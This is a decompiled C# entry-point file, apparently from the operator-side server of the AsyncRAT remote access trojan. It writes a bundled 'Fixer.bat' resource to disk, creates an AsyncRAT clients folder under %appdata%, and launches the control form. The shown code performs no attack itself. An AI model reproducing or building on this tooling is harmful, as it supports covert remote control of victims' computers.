using System;
using System.IO;
using System.Windows.Forms;
using Server.Properties;

namespace Server
{
	// Token: 0x02000027 RID: 39
	internal static class Program
	{
		// Token: 0x0600016F RID: 367 RVA: 0x000196F4 File Offset: 0x000178F4
		[STAThread]
		private static void Main()
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			try
			{
				string path = Path.Combine(Application.StartupPath, "Fixer.bat");
				if (!File.Exists(path))
				{
					File.WriteAllText(path, Resources.Fixer);
				}
			}
			catch
			{
			}
			try
			{
				Directory.CreateDirectory(Environment.ExpandEnvironmentVariables("%appdata%\\AsyncRAT\\clients\\name"));
			}
			catch
			{
			}
			Program.form1 = new Form1();
			Application.Run(Program.form1);
		}

		// Token: 0x0400014D RID: 333
		public static Form1 form1;
	}
}
